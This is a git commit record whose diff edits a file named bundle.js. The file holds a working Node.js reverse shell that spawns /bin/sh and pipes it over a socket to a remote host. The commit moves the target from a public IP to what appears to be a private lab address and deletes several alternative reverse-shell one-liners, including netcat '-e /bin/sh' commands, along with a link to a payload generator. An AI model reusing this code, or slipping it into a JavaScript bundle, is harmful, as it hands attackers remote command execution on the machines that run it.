d66cc53f36df8957977bd74b03c368cc3ca5cb30
yarinc99 <116642200+yarinc99@users.noreply.github.com>
2022-10-25 14:33:54 +0300

    Update bundle.js

--- bundle.js
+++ bundle.js
@@ -3,24 +3,10 @@
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(443, "165.227.224.60", function(){
+    client.connect(8080, "192.168.33.1", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
     });
-    return /a/; // Prevents the Node.js application from crashing
+    return /a/; // Prevents the Node.js application form crashing
 })();
-
-
-or
-
-require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')
-
-or
-
--var x = global.process.mainModule.require
--x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')
-
-or
-
-https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
